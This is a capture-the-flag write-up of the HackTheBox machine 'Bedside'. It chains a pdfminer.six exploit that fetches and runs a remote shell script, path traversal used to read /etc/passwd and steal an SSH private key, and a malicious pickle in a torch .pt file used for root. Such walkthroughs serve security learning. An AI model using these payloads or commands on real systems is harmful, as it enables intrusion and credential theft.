# Bedside - HackTheBox

Difficulty: Medium

This was actually pretty damn fun 😂

## Enumeration

- Ports 22,80 are open
- Port 80 has 2 subdomains
    - bedside.htb
    - research.bedside.htb (found by fuzzing)


## Web Enumeration

- research.bedside.htb contains a file upload endpoint that accepts files of the types mentioned in it.
- On checking this out on burpsuite we can find an interesting header `X-Powered-By: pdfminer.six`
- One of the few CVEs I could find for pdfminer.six was [this one](https://github.com/BardLaudian/CVE-2025-64512) so I used it as follows:

```bash
python gen_payload.py   --path "/var/www/research.bedside.htb/uploads/payload"   --command "curl http://your-ip:8000/shell.sh|bash"   --pdf-out trigger.pdf --gz-out payload.pickle.gz
```

- This gave a reverse shell. (Check the other writeups to see what this method is).

## Pivoting

- When we enter the shell, we can see that this is a plain docker container, so we can't exactly get user yet.
- On checking `/tmp` I saw a `portscan.sh` file. All it did was scan ports from 1-5000.
- On execution, it detected that port 3000 was open.
- So when we do `curl http://127.0.0.1:3000` it just gave a react page, which accepted images for upload. So the hint was to test for path traversals. However we can see that the app itself isn't vulnerable to it, but the server on the other hand could be vulnerable as follows:

```bash
curl -s --path-as-is http://127.0.0.1:3000/../../../../../etc/passwd
```

- This revealed a developer user so I got the user flag as follows:

```bash
curl -s --path-as-is http://127.0.0.1:3000/../../../../../../home/developer/user.txt
```

- But to get ssh access I exfiltrated the Private key:

```bash
curl -s --path-as-is http://127.0.0.1:3000/../../../../../../home/developer/.ssh/id_rsa
```

- This finally gave shell access as `developer`.


## Privilege Escalation

- On running `sudo -l` we get this:

```bash
Matching Defaults entries for developer on bedside:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User developer may run the following commands on bedside:
    (ALL) NOPASSWD: /usr/bin/python3 /opt/trainer/bedside_trainer.py
```

- This program uses `monai` and `pytorch` to train ml models.
- On checking the code we can get the flow as follows:

1. It checks `/datastore/processed` for any files. If it exists it picks them up and uses it in the model.
2. It also loads `.pt` files from `/datastore/checkpoints` and processes them.

- From previous experience, I already know that `.pt` files, if handled incorrectly can be abused to gain RCE. But the code itself doesn't seem to be doing much with it. So I checked the libraries using `python3 -m pip list`. We can see that it runs **torch 2.5.0** and **monai 1.5.0**.
- MonAI 1.5.0 is vulnerable to RCE due to insecure deserialization of pickle files. And torch 2.5.0 is vulnerable to deserialization when using the `torch.load()` function without `weights_only=True` as it defaults this value to false, allowing it to load untrusted model files.
- There are 2 POCs available for this [here](https://www.ipbuf.com/static/cve/2025/CVE-2025-58756_en.html) and [here](https://www.ipbuf.com/static/cve/2025/CVE-2025-58757_en.html).
- I wrote a small script of my own to generate the `.pt` files:

```python
import os
import torch

class Proof:
    def __reduce__(self):
        return (os.system, ("echo [base64 encoded payload] | base64 -d | bash",))

payload = {
    "proof": Proof()
}

torch.save(payload, "evil.pt")
print("Wrote evil.pt")
```

- To get evil.pt into `/datastore` we'll need access to the datawrangler user (same as the one in the container). So I made an educated guess and assumed that the `/datastore` we see in the container is actually a mount point and we can just upload the needed files there.
- So before we finally get the exploit going, create a dummy image file using `convert -size 800x800 xc:white white.png` and download this into the `/datastore/processed` directory in the container. Also delete any other files that are found in the directory.
- After this, from the `developer` user, download evil.pt onto your machine and then download it into `/datastore/processed` on the container.
- In the `developer` shell, run

```bash
sudo /usr/bin/python3 /opt/trainer/bedside_trainer.py
```

- Keep the listener active on your attacker box. With this you'll gain a root shell.


Happy Hacking :)
